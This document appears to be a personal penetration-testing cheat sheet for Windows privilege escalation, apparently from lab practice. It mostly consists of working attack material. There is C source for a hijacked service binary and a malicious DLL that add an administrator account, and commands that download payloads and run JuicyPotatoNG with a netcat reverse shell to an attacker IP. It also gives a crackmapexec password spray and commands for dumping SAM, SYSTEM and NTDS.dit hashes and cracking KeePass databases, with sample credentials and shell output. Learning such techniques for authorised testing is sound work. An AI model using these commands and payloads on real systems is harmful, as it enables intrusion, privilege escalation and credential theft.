## Enumeration need to be done before Escalation

- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

----

# check on C:
```
dir C:/
```
### Display all groups and current users
```ps1
whoami /groups
```

### To know other local users
```ps1
Get-LocalUser
```

### To know local groups 
```ps1
Get-LocalGroup
```

### To fetch the members of particular group
```ps1
Get-LocalGroupMember Administrators
```
_note: here the Administrators is actually the group name_

### To know system infomation
```ps1
systeminfo
```

### Network configuration
```ps1
ipconfig /all
```

### To display routing table
```ps1
route print
```

### To display all active TCP connection
```ps1
netstat -ano
```

### To check installed application 
##### 32 Bit Application 
```ps1
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

##### 64 Bit Application 
```ps1
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

### To know running process
```ps1
Get-Process
```

### Search file by its file type 

#### Examples
##### `kdbx` file type search from `c:` directory
```ps1
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

##### Sensitive data search on `XAMPP` directory
```ps1
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

##### Sensitive data search on `C:` directory file type of `txt`and `ini`
```ps1
Get-ChildItem -Path C: -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

##### Other search 
```ps1
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

### To Know about particular user
```ps1
net user username
```
_note: username here is the existing user of computer_

### To run process or application with different user 
```ps1
runas /user:backupadmin cmd
```

### To check powershell history 
```ps1
	Get-History
```
_Note [not recommended] it can get clear after typing clear_

### Better way to get powershell history 
```ps1
(Get-PSReadlineOption).HistorySavePath
```

### Saving creds as variable for ease
```ps1
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
```

[PS Remoting]
```ps1
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
whoami
```

### Better way to use ps-remoting [evil-winrm]
```rb
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
whoami
cd C:\
```

```rb
/usr/share/doc/python3-impacket/examples/psexec.py CORP/jeffadmin:"BrouhahaTungPerorateBroom2023!"@192.168.163.75
```


```rb
Mon Jan-1 5:29:33am)-(CPU 7.2%:0:Net 1)-(kali:~)-(348K:60)
> /usr/share/doc/python3-impacket/examples/psexec.py CORP/jeffadmin:"BrouhahaTungPerorateBroom2023!"@192.168.163.75
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.163.75.....
[*] Found writable share ADMIN$
[*] Uploading file mOFABSYb.exe
[*] Opening SVCManager on 192.168.163.75.....
[*] Creating service SBhM on 192.168.163.75.....
[*] Starting service SBhM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.22000.856]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> exit
```
### Wget alternative for windows powershell (Incase of wget not supported)
```ps1
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
```

### To automate the windows enumeration better use winpeas
```ps1
./winpeas.exe | tee -a winpeas.log
```
> https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md

### Service Binary Hijacking 
```ps1
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
_you can still automate this with powerup_

### Icacls to check permission of binary

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

> icacls permissions mask

```
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```

_you can pretty much abuse the binary to achieve the Local Administrator if you have `F` right by replacing that binary with your vulnerable binary_

##### change binary and replace with the binary 
[compilation]

```C
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user astute Test@123 /add");
  i = system ("net localgroup administrators astute /add");
  
  return 0;
}
```

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```ps1
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```
##### Restarting the system
```ps1
shutdown /r /t 0
```
_need to be done to push the changes done on service binary hijacking_

### Automating the Windows Privilege Escalation 
[god level tool powerup and priveesccheck]

### Dot sourcing the powershell script
```ps1
. .\PowerUp.ps1
```

also you can use import for the same like
```ps1
Import-Module PowerUp.ps1
```

## Dot Sourcing the script
```ps1
. .\PrivescCheck.ps1; Invoke-PrivescCheck
```

```
powershell -ep bypass -Command ". ./priv.ps1; Invoke-PrivescCheck"
```
### Powerup 
```ps1
Invoke-Allchecks
```
_after dot sourcing or importing the powerup module ps1 script_

### DDL hijacking 
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user astute Test@123 /add");
  	    i = system ("net localgroup administrators astute /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

#### DDL Compilation 
```sh
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

### Start service

```php
Start-Service GammaService
```

```php
net stop mysql
```

### Scheduling Tasks
```rb
schtasks /query /fo LIST /v
```

_not just find the binary running by high level and replace if you have permission_

### CrackmapExec 
-password spray_

```php
crackmapexec smb 192.168.150.222 -u user.txt -p WelcomeToWinter0121
```

### CVE
https://github.com/nu11secur1ty/CVE-mitre/blob/main/2023/CVE-2023-21752/PoC-3.0/Release/PoC-CVE-2023-21752.exe


#### trick
-> check if current user can Impersonate a client after authentication Enabled  option 

```ps1
whoami /priv
```

```sh
ASTUTEC:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` privilege is true so we can use zero day exploit to do privilege escaltion [ZERODAY] JuicyPotato

```
ASTUTEC:\test> iwr -uri http://192.168.45.244/JuicyPotatoNG.exe -o potato.exe
ASTUTEC:\test> dir


    Directory: C:\test


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/24/2025   5:27 AM         153600 potato.exe                                                           


ASTUTEC:\test> 
```


### priv esc 2
```sh

ASTUTEC:\test> ./potato.exe -t * -p c:\test\nc.exe -a "192.168.45.244 4445 -e c:\windows\system32\cmd.exe"
```

```sh
(Fri Jan-1 8:29:39am)-(CPU 8.1%:0:Net 4)-(kali:~/Desktop/shared_folder/tools/reverse_shell)-(112K:3)
> nc -nvlp 4445
listening on [any] 4445 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.221.247] 49752
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system

C:\>hostname
hostname
WEB02```

# manual cracking SAM and System File

```
whoami /priv
```

if `SeBackupPrivilege` is enabled 
```
Export sam & system

	reg save hklm\sam c:\users\jackie\Documents\sam

reg save hklm\system c:\users\jackie\Documents\system
```

```
impacket-secretsdump -sam ./SAM -system ./SYSTEM LOCAL
```

sometime if that doesn't work 
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

```
nano raj.dsh

set context persistent nowriters

add volume c: alias raj

create

expose %raj% z:

unix2dos raj.dsh
```

```
cd C:\Temp

upload raj.dsh

diskshadow /s raj.dsh

robocopy /b z:\windows\ntds . ntds.dit
```

```
impacket-secretsdump -ntds ntds.dit -system system local
```

# Dumping SAM Database
```
reg save HKLM\\SAM sam.save
reg save HKLM\\SYSTEM system.save
```

```
impacket-secretsdump -sam ./SAM -system ./SYSTEM LOCAL
```

# Dumping the NTDS.dit Database
```
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCA
```

# kee2pash
```
keepass2john Database.kdbx > john.hash
```

```
john john.hash 
```

```
keepass2 database.kdbx
```
